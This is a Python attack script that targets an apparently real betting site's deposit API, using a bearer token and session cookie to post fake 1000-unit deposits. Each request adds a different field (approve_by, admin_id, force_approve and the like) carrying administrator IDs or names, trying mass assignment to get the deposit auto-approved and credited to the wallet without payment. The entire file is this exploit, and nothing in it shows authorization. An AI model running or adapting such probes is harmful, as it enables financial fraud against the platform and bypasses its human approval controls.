#!/usr/bin/env python3
"""probe_approveby.py — Try approve_by (not approved_by) + field name variants."""
import pathlib, requests, uuid, time

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json",
       "Cookie": f"AWSALB={AWSALB}"}

BANK_INFO  = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT   = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"
ADMIN_UUID = "5958356c-eb4e-4e07-a155-83e4382e3532"   # admin
VAK88ADMIN = "8155e2a2-77f1-47a1-8242-581be5e00550"   # vak88admin

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

BASE = {"deposit_amount": 1000.0, "is_auto_slip": True,
        "payment_bank_information_id": BANK_INFO, "deposit_account_id": DEP_ACCT}

# Field name variants with admin UUID
field_variants = [
    {"approve_by":      ADMIN_UUID, "approve_status": "success"},
    {"approve_by":      ADMIN_UUID},
    {"approver_id":     ADMIN_UUID, "approve_status": "success"},
    {"approver":        ADMIN_UUID, "approve_status": "success"},
    {"approved_by_id":  ADMIN_UUID, "approve_status": "success"},
    {"admin_id":        ADMIN_UUID, "approve_status": "success"},
    {"admin_uuid":      ADMIN_UUID, "approve_status": "success"},
    {"approve_user_id": ADMIN_UUID, "approve_status": "success"},
    # vak88admin UUID
    {"approve_by":      VAK88ADMIN, "approve_status": "success"},
    {"admin_id":        VAK88ADMIN, "approve_status": "success"},
    # Username variants (not UUID)
    {"approve_by":      "admin",      "approve_status": "success"},
    {"approve_by":      "vak88admin", "approve_status": "success"},
    {"approve_by":      "Vak88z",     "approve_status": "success"},
    # Nested admin object
    {"admin": {"id": ADMIN_UUID, "username": "admin"}, "approve_status": "success"},
    # Approve flag only
    {"is_approved": True, "approve_status": "success"},
    {"auto_approve": True},
    {"force_approve": True, "approve_status": "success"},
]

hits = []
for extra in field_variants:
    body = {**BASE, **extra, "slip_image_url": f"{uuid.uuid4()}.jpg"}
    r = requests.post(f"{MGAPI}/mb/deposit-transaction", headers=HDR, json=body, timeout=12)
    if r.ok:
        d = r.json()
        status = d.get("approve_status", d.get("status", "?"))
        bal = d.get("balance_after_deposit", d.get("balance_after_success", "?"))
        key = list(extra.keys())[0]
        print(f"  {key}={str(extra[key])[:20]}: status={status}  bal_after={bal}")
        if status in ("success", "approved"):
            hits.append(d)
            print(f"  [!!!] APPROVED! id={d.get('id')} checking wallet...")
            time.sleep(1)
            print(f"  wallet: {wallet()}")
    else:
        key = list(extra.keys())[0]
        print(f"  {key}: HTTP {r.status_code}")

if hits:
    print(f"\n[!!!] {len(hits)} deposits approved!")
else:
    print("\nAll deposits created as 'waiting' — approve_by injection blocked")

print(f"\nwallet final: {wallet()}")
